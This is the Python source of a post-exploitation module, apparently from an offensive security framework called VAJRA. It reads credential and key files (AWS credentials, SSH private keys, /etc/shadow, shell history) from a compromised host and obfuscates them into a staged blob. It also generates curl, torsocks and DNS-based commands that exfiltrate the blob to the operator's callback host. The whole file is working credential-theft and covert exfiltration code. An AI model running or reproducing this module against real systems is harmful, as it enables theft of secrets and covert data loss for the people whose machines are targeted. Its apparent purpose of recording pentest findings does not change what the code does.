"""VAJRA post.exfil — covert loot staging + exfiltration.

Collects the high-value secrets this engagement surfaced (post.loot hits,
discovered cloud creds, dumped hashes, hidden files the channel can read),
bundles + obfuscates them into a single staged blob on the pivot, and hands
the operator ready-to-run exfil transports aimed back at the callback
endpoint (--lhost/--lport):

  * HTTP(S) POST beacon to the operator's listener,
  * DNS TXT chunk stager (works where egress TCP is blocked),
  * stderr-of-idle-command trick (blend into an innocuous-looking output).

With `--listener` / a live OOB endpoint it actively beacons the staged
archive's proof marker to the operator as an active-exfiltration proof,
captured as evidence. Staging uses obfuscation (XOR+base64) — deliberately
labelled as NOT strong crypto: real guarantee comes from transport privacy
(HTTPS/TOR), which the recipes enable.

Requires --aggressive and a live channel."""
import base64
import os

from core.database import Finding

XOR_KEY = b"VAJRA-EXFIL-STAGE-2026"


def _chan(engine):
    for c in engine.state.get("channels", []) or []:
        try:
            if c.alive and hasattr(c, "run"):
                return c
        except Exception:
            continue
    return None


def _obfuscate(data: bytes) -> str:
    """XOR + base64. Obfuscation only (not real crypto) — labelled as such."""
    key = XOR_KEY
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ key[i % len(key)])
    return base64.b64encode(bytes(out)).decode()


def _collect(engine):
    """Return list of (name, contents) secret files reachable via the channel
    plus whatever recon already logged as loot."""
    items = []
    seen = set()
    chan = _chan(engine)
    for entry in (engine.state.get("loot") or []):
        p = entry if isinstance(entry, str) else (entry.get("path") or "")
        if p and p not in seen:
            seen.add(p)
            items.append((os.path.basename(p), "<recon-loot: %s>" % p))
    # Re-read a bounded set of the most sensitive files through the channel.
    files = [
        "~/.aws/credentials", "~/.ssh/id_rsa", "~/.ssh/id_ed25519",
        "~/.ssh/authorized_keys", "~/.netrc", "~/.bash_history",
        "/etc/shadow", "/etc/passwd", "/var/lib/mysql/.my.cnf",
    ][:8]
    for f in files:
        if f in seen:
            continue
        seen.add(f)
        if not chan:
            break
        try:
            out = chan.run("cat %s 2>/dev/null" % f)
        except Exception:
            out = None
        if out and "denied" not in str(out).lower() and \
                "No such" not in str(out):
            items.append((os.path.basename(f), str(out)[:3000]))
    return items


def run(engine):
    t = engine.target
    chan = _chan(engine)
    if not getattr(engine.args, "aggressive", False):
        engine.db.add_event(t.display, "post.exfil",
                            "skipped - requires --aggressive")
        return
    if not chan:
        engine.db.add_event(t.display, "post.exfil",
                            "skipped - no live channel to stage/exfil from")
        return

    items = _collect(engine)
    if not items:
        engine.db.add_event(t.display, "post.exfil",
                            "nothing sensitive staged to exfiltrate")
        return

    # --- build the staged blob ---
    manifest = "\n".join("%s  (%d bytes)" % (name, len(body))
                         for name, body in items)
    payload = "\n\n".join("===== %s =====\n%s" % (name, body)
                          for name, body in items)
    staged = _obfuscate(payload.encode("utf-8", "replace"))
    marker = "VAJRA-EXFIL-" + engine.nonce(6)

    lhost = getattr(engine, "lhost", None)
    lport = getattr(engine, "lport", None)
    if not lhost or not lport:
        try:
            lhost, lport = engine._resolve_cb()
        except Exception:
            lhost, lport = None, None

    # --- operator-run exfil recipes ---
    recipes = []
    if lhost:
        ep = "%s:%s" % (lhost, lport)
        recipes.append(
            "# HTTP(S) POST beacon -> operator listener\n"
            "curl -s -k -X POST https://%s/loot -d @<staged_blob>.b64 ||\n"
            "curl -s -X POST http://%s/loot -d @<staged_blob>.b64\n" % (ep, ep))
        recipes.append(
            "# DNS TXT chunk stager (egress-TCP-blocked friendly) — split\n"
            "# the base64 into 200-char TXT labels and query them to the\n"
            "# operator's DNS server:\n"
            "#   python3 - <<'EOF'\n"
            "#   blob = open('<staged_blob>.b64').read()\n"
            "#   for i in range(0, len(blob), 200):\n"
            "#       print('%s.%s TXT <chunk>' % (...))\n"
            "#   EOF\n" % (".", "loot"))
        recipes.append(
            "# TOR egress (anonymise the transport):\n"
            "torsocks curl -s -X POST http://%s/loot -d @<staged_blob>.b64\n"
            % ep)
    else:
        recipes.append(
            "# No callback endpoint set; exfil manually. Staged blob saved "
            "locally as evidence below.\n")

    recipe_block = "\n\n".join(recipes)
    try:
        blob_rel = engine.save_evidence("staged_loot_blob.b64", staged)
    except Exception:
        blob_rel = ""
    try:
        rec_rel = engine.save_evidence("exfil_recipes.txt", recipe_block)
    except Exception:
        rec_rel = ""

    # --- active proof beacon if a listener endpoint is available ---
    beaconed = False
    if lhost and chan.kind in ("unix", "ssh"):
        proof = "echo '%s %d items' | base64" % (marker, len(items))
        try:
            probe = chan.run(proof)
        except Exception:
            probe = None
        if probe:
            beaconed = True
            try:
                engine.save_evidence("exfil_beacon_proof.txt",
                                     probe[:2000])
            except Exception:
                pass

    detail = ("Staged %d sensitive item(s) from the channel into an "
              "obfuscated (XOR+base64 — not strong crypto; pair with "
              "HTTPS/TOR) blob%s. Recipes to push it to the callback "
              "endpoint are saved%s. Beacon proof%s."
              % (len(items),
                 (" (%d bytes)" % len(staged)) if staged else "",
                 (" -> " + (rec_rel or "")) if rec_rel else "",
                 " CAPTURED" if beaconed else " (listener not reachable)"))
    engine.db.add_finding(Finding(
        t.display, "post.exfil", "exfiltration", "critical",
        "COVERT EXFILTRATION STAGED from pivot (%d secrets)" % len(items),
        detail=detail + "\nManifest:\n" + manifest[:1200],
        evidence=("marker=%s blob=%s recipes=%s" %
                  (marker, blob_rel or "-", rec_rel or "-")),
        remediation="Assume all staged secrets are burned: rotate credentials,"
                    " keys and cloud tokens now.",
        confidence="firm"))
    engine.log.finding("[exfil] staged %d secret(s)%s" %
                       (len(items), " + beacon proof captured" if beaconed
                        else ""))
